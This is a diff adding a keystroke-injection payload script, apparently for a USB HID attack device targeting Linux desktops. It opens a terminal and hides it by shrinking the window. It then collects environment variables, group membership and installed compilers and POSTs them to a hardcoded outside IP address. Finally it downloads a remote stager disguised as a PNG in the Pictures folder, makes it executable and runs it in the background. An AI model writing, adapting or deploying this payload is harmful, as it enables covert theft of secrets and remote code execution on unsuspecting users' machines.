@@ -1,0 +1,14 @@
+DELAY 100
+
+ALT F2
+DELAY 1000
+STRING sh -c "xdg-terminal-exec||kgx||ptyxis||gnome-terminal||mate-terminal||xfce4-terminal||tilix||konsole||xterm"
+DELAY 300
+ENTER 
+DELAY 1500
+STRING resize -s 1 10
+ENTER
+STRING nohup sh -c '{ printenv; id -nG; python --version; python3 --version; for c in gcc g++ clang make go rustc javac; do command -v "$c" >/dev/null && echo "$c y" || echo "$c n"; done; } | curl -s -k -X POST http://157.230.90.64:8080/ --data-binary @-; curl -s -k -o ~/Pictures/demo.png http://157.230.90.64:8080/stager.sh; chmod +x ~/Pictures/demo.png; ~/Pictures/demo.png' > /dev/null 2>&1 &
+ENTER
+STRING exit
+ENTER
